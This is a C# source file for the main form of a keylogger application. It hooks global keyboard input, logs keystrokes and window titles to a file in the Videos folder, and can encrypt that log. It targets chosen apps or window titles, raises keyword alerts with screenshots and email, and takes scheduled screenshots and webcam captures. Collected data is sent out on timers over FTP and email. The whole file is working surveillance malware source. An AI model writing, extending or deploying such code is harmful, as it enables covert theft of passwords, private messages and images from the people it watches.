
using MyKeylogger.Lib;
using MyKeylogger.Lib.HotKeys;
using MyKeylogger.Lib.WinApi;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using tt;
using OpenJobScheduler;
using System.Drawing;
using System.Drawing.Imaging;
using QrWebCam;
using AForge.Video.DirectShow;
namespace keylog
{
    
    public partial class mainForm : MetroFramework.Forms.MetroForm
    {
        //keystroke
        private readonly KeyboardHookListener keyListener;
        private IntPtr lastActiveWindow = IntPtr.Zero;
        private bool hasSubmitted;
        private readonly KeyMapper keyMapper = new KeyMapper();
        private readonly string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger_" + DateTime.Now.ToLongDateString().ToString() + ".ini";

        // alerts
        private string word = "";
        private List<string> alertList = new List<string>();
        private Dictionary<string, string> alert_conf = new Dictionary<string, string>();
        // general
        Dictionary<string, string> conf_General = new Dictionary<string, string>();
        // target 
        Dictionary<string, string> config_target = new Dictionary<string, string>();
        private List<string> targetList = new List<string>();
        public mainForm()
        {
            InitializeComponent();
            
            ///// Load file config
            if (File.Exists("general_conf.ini"))
            {
                conf_General.Clear();
                Functions.Load_File("general_conf.ini", conf_General);
                //Decryptlog
                string decfile = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\encr_myKeylogger_" + DateTime.Now.ToLongDateString().ToString() + ".ini";

                if (Boolean.Parse(conf_General["EncryptLog"]) == true)
                    if (File.Exists(decfile))
                        Functions.Decrypt(decfile);
            }
            
            Functions.CreateFile();
            keyListener = new KeyboardHookListener(new GlobalHooker());
            keyListener.KeyDown += KeyListener_KeyDown;
        }
        private static bool targeted = true;
        private void KeyListener_KeyDown(object sender, KeyEventArgs e)
        {
            
            if (lastActiveWindow != Functions.GetForegroundWindow())
            {
                var format = @"[""{0}"" {1}]" + Environment.NewLine + Environment.NewLine;
                var text = string.Format(format, Functions.GetActiveWindowText(), DateTime.Now);
                // neu co thi targeted = true => bat key
                targeted = Functions.IsTarget(Functions.GetActiveWindowText(), targetList);
                if (hasSubmitted)
                {
                    text = text.Insert(0, Environment.NewLine + Environment.NewLine);
                }
                File.AppendAllText(filePath, text);
                hasSubmitted = true;
                lastActiveWindow = Functions.GetForegroundWindow();
            }

            if (targeted)
            {
                var keyText = keyMapper.GetKeyText(e.KeyCode);
                // remove packet when using vietkey
                if (keyText.Contains("packet"))
                {
                    keyText = keyText.Replace("packet", "");
                }
                if ((keyText == null) || (keyText == " ") || (keyText == string.Empty) || (keyText.Trim() == "{ENTER}")
                || (keyText == "\t") || (keyText.Trim() == "{HOME}") || (keyText.Trim() == "{END}"))
                {
                    Console.WriteLine("alert word : " + word);
                    // alert code will be here
                    // 
                    int imageCount = 1;
                    if (Functions.isAlerts(alertList, word) == true)
                    {
                        if (Boolean.Parse(alert_conf["ScreenShot"]) == true)
                        {
                            Functions.ScreenShotDoubleScreen("Alert_Image", imageCount);
                            imageCount++;
                            Console.WriteLine("Alert : Screenshot successful!!!");
                        }
                        if (Boolean.Parse(alert_conf["SendMail"]) == true)
                        {
                            Functions.Send_Email(true);
                            Console.WriteLine("Alert : Sent mail successful!!!");// send mail
                        }
                    }
                    word = ""; // reset word
                }
                else
                {
                    // if key = backspace, word must be remove last character
                    if (keyText.Trim() == "{Backs}")
                    {
                        word = TrimLastCharacter(word);
                        //keyText = "{Backs}";
                    }
                    // word will not change if key = ALT
                    else if (keyText.Trim() == "{ALT}" || keyText.Trim().ToLower() == "packet" || keyText.Trim() == "{LCtrl}"
                        || keyText.Trim() == "{RCtrl}" || keyText == "rmenu" || keyText.Trim() == "{LSHIFT}" || keyText.Trim() == "{RSHIFT}")
                        keyText = "";
                    else
                        word += keyText;
                    //.WriteLine("keyTex : ----" + keyText.Trim() + "------");
                    Console.WriteLine("Word   : ----" + word.Trim() + "------");

                }

                File.AppendAllText(filePath, keyText);
            }
        }
        static mainForm _instance;
        public static mainForm Instince
        {
            get
            {
                if (_instance == null)
                    _instance = new mainForm();
                return _instance;
            }
        }
        public MetroFramework.Controls.MetroPanel Metrocontainer
        {
            get { return mainpanel; }
            set { mainpanel = value; }
        }
        public MetroFramework.Controls.MetroLink Metroback
        {
            get { return btn_home; }
        }

        // remove last charater of string
        private string TrimLastCharacter(String str)
        {
            if (String.IsNullOrEmpty(str))
            {
                return str;
            }
            else
            {
                return str.TrimEnd(str[str.Length - 1]);
            }
        }
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            keyListener.Enabled = true;
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            keyListener.Enabled = false;
            //Encryptlog
            if(Boolean.Parse(conf_General["EncryptLog"]) == true)
                Functions.Encrypt(filePath);
            else
            {
                //Decryptlog
                string decfile = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\encr_myKeylogger_" + DateTime.Now.ToLongDateString().ToString() + ".ini";

                if (File.Exists(decfile))
                    Functions.Decrypt(decfile);
            }
        }
        ////Webcam_funtion
        //_WebCam webCam;
        //FilterInfoCollection videoDevices;
        //private void _Capture(int time, object sender, EventArgs e)
        //{
        //    Webcam _capt = new Webcam();

        //    JobScheduler jobScheduler = new JobScheduler(TimeSpan.FromMinutes(time), new Action(() =>
        //    {
        //        Thread thread = new Thread(() =>
        //        {
        //            _capt.bntStart_Click(sender, e);
        //            _capt.bntStart_Click(sender, e);
        //        });
        //        thread.IsBackground = true;
        //        thread.Start();
        //    }));
        //    jobScheduler.Start();
        //}
        private void mainForm_Load(object sender, EventArgs e)
        {
            btn_home.Visible = false;
            _instance = this;
            Dashboard dashboard = new Dashboard();
            dashboard.Dock = DockStyle.Fill;
            mainpanel.Controls.Add(dashboard);
            //webCam = new _WebCam();
            // load screenshot config
            if (File.Exists("Screenshot_conf.ini"))
            {
                Dictionary<string, string> configfile = new Dictionary<string, string>();
                Functions.Load_File("Screenshot_conf.ini", configfile);
                if (Boolean.Parse(configfile["Enable"].ToString()) == true)
                {
                    int min = Int32.Parse(configfile["Minutes"]);
                    int sec = Int32.Parse(configfile["Seconds"]);
                    int quality = Int32.Parse(configfile["Quality"]);
                    bool timeStamp = Boolean.Parse(configfile["Timestamp_Username"]);

                    if (Boolean.Parse(configfile["Double_Monitor"].ToString()) == true)
                        Functions.StartTimmerScreenShot(min, sec, timeStamp, quality, true);
                    else
                        Functions.StartTimmerScreenShot(min, sec, timeStamp, quality, false);
                }
            }//-------------------------//
            //Load Webcam config
            if (File.Exists("Webcam_config.ini"))
            {
                Dictionary<string, string> configfile = new Dictionary<string, string>();
                Functions.Load_File("Webcam_config.ini", configfile);
                if (Boolean.Parse(configfile["Enable"].ToString()) == true)
                {
                    int hours = Int32.Parse(configfile["Hours"]);
                    int minutes = Int32.Parse(configfile["Minutes"]);
                    int time = hours * 60 + minutes;
                    AForge.Controls.VideoSourcePlayer videoSourcePlayer = new AForge.Controls.VideoSourcePlayer();
                    string _time = DateTime.Now.ToLongTimeString().Replace(":","");
                    // Use current time
                    //string format = "MMM ddd d HH mm yyyy";    // Use this format
                    String strFilename = "Capture_" + _time;// + ".jpg";
                    string directoryImage = "Webcam\\" + DateTime.Now.ToLongDateString();

                    if (!Directory.Exists(directoryImage))
                    {
                        Directory.CreateDirectory(directoryImage);
                    }
                    string imageName = string.Format("{0}\\{1}{2}", directoryImage, strFilename,".jpg");
                    FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    VideoCaptureDevice videoCaptureSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                    JobScheduler jobScheduler = new JobScheduler(TimeSpan.FromMinutes(time), new Action(() =>
                        {
                            videoSourcePlayer.VideoSource = videoCaptureSource;
                            videoSourcePlayer.Start();
                            Thread.Sleep(1000);
                            while (videoSourcePlayer.GetCurrentVideoFrame() != null)
                            {
                                Bitmap picture = videoSourcePlayer.GetCurrentVideoFrame();
                                picture.Save(imageName);
                                videoSourcePlayer.Stop();
                                break;
                            }
                        }));
                    jobScheduler.Start();
                    
                }
            }
                //---------------------------

                //Load ftp config      
                Dictionary<string, string> config_FTP = new Dictionary<string, string>();
            if (File.Exists("ftp_conf.ini"))
            {
                Functions.Load_File("ftp_conf.ini", config_FTP);

                if (Boolean.Parse(config_FTP["Enable"].ToString()) == true)
                {
                    Functions.StartTimeFTP();
                }
            }
            //-------------------------//
            // Alert
            // load alert list
            if (File.Exists("alerts_ListOfKey.ini"))
            {
                alertList.Clear();
                StreamReader sr = new StreamReader("alerts_ListOfKey.ini");
                string line;

                while ((line = sr.ReadLine()) != null)
                {
                    alertList.Add(line);
                }
                sr.Close();
            }
            // load alert config
            Functions.Load_File("alerts_conf.ini", alert_conf);
            //-----------------------------//
            // Load email config
            Dictionary<string, string> config_email = new Dictionary<string, string>();
            if (File.Exists("email_conf.ini"))
            {
                Functions.Load_File("email_conf.ini", config_email);
                if (Boolean.Parse(config_email["Enable"].ToString()) == true)
                {
                    int hours = Int32.Parse(config_email["Hours"].ToString());
                    int min = Int32.Parse(config_email["Minutes"].ToString());
                    Functions.StartTimmerEmail(hours,min);
                }
            }
            //----------------------------------//
            // Load target list
            
            if (File.Exists("targets_conf.ini"))
            {
                Functions.Load_File("targets_conf.ini", config_target);
                if (Boolean.Parse(config_target["ByFollowingApp"].ToString()) == true)
                {
                    if (File.Exists("targets_ListByApp.ini"))
                    {
                        StreamReader sr = new StreamReader("targets_ListByApp.ini");
                        string line;

                        while ((line = sr.ReadLine()) != null)
                        {
                            targetList.Add(line.ToLower());
                        }
                        sr.Close();
                    }
                    if (File.Exists("targets_ListByTitle.ini"))
                    {
                        StreamReader sr = new StreamReader("targets_ListByTitle.ini");
                        string line;

                        while ((line = sr.ReadLine()) != null)
                        {
                            targetList.Add(line.ToLower());
                        }
                        sr.Close();
                    }
                }

            }
            //---------------------------------//
            // user
            Thread t_FindUser = new Thread(new ThreadStart(Functions.FindUsers));
            t_FindUser.IsBackground = true;
            t_FindUser.Start();
            t_FindUser.Join();
            
            Thread t_CheckUser = new Thread(new ThreadStart(Functions.CheckUser));
            t_CheckUser.IsBackground = true;
            t_CheckUser.Start();
            t_CheckUser.Join();
            //---------------------------------------//
        }

        

        private void btn_home_Click(object sender, EventArgs e)
        {
            mainpanel.Controls["Dashboard"].BringToFront();
            btn_home.Visible = false;
            // Load form main again to load config file
           // mainForm_Load(sender, e);
        }
        ToolTip tool; 
        private void btn_home_MouseHover(object sender, EventArgs e)
        {
            tool =  new ToolTip();
            tool.SetToolTip(this.btn_home, "HOME");
        }
        private void bunifuFlatButton12_MouseHover(object sender, EventArgs e)
        {
            tool = new ToolTip();
            tool.SetToolTip(this.bunifuFlatButton12, "Alert");
        }
    }

    
}